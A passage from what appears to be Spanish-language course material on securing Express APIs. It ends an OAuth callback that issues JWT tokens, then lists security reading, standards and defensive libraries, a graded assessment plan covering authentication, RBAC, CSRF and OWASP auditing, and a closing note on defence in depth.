  const accessToken  = signAccess({ sub: req.user.id, role: req.user.role });
  const refreshToken = signRefresh({ sub: req.user.id });
  res
    .cookie("refreshToken", refreshToken, cookieOptions())
    .redirect(`${process.env.FRONTEND_URL}/oauth-callback#access_token=${accessToken}`);
}
```

---

## Recursos complementarios

### Lecturas

- [OWASP API Security](https://owasp.org/API-Security/)
- [OWASP Top 10 Web](https://owasp.org/www-project-top-ten/)
- [Auth0 Blog](https://auth0.com/blog/)
- [JWT Best Practices (RFC 8725)](https://datatracker.ietf.org/doc/html/rfc8725)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practices-security.html)

### Estándares

- [RFC 6749 - OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc6749)
- [OpenID Connect](https://openid.net/connect/)
- [CSP](https://content-security-policy.com/)

### Herramientas

- **helmet** (cabeceras).
- **express-rate-limit** (rate limit).
- **passport** (OAuth, SAML).
- **bcrypt** / **argon2** (hashing).
- **csurf** (CSRF tokens).
- **DOMPurify** (sanitizar HTML).
- **Snyk** (vulnerabilidades).
- **Sentry** (errores).

---

## Evaluación sugerida

1. **Login + Registro (20%)**: hashing robusto, JWT, refresh rotation.
2. **OAuth (15%)**: login con Google u otro proveedor.
3. **Roles y permisos (15%)**: RBAC + ownership.
4. **Cookies y CSRF (15%)**: cookies HttpOnly + CSRF token.
5. **Defensas (20%)**: CORS, CSP, rate limiting, sanitización.
6. **Auditoría (15%)**: aplicar OWASP API Top 10 a un proyecto real.

---

> **Nota para el estudiante**: seguridad es un **proceso**, no un feature. Aplica el principio de "defense in depth": múltiples capas independientes, asumiendo que cualquiera puede fallar.
